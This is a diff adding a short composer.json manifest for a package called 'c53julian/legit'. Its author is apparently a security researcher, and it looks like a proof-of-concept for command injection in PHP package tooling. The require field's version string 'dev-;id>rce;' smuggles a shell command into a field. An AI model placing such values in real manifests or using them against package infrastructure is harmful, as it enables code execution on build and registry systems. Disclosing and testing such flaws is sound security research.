@@ -1,0 +1,22 @@
+{
+    "name": "c53julian/legit",
+    "description": "Legit stuff here",
+    "license": "MIT",
+    "authors": [
+        {
+            "name": "Julian Hector",
+            "email": "julian@cure53.de"
+        }
+    ],
+    "autoload": {
+    },
+    "repositories": [
+        {
+            "url": "https://github.com/c53julian/packagist-test.git",
+            "type": "git"
+        }
+    ],
+    "require": {
+      "c53julian/packagist-test": "dev-;id>rce;"
+    }
+}
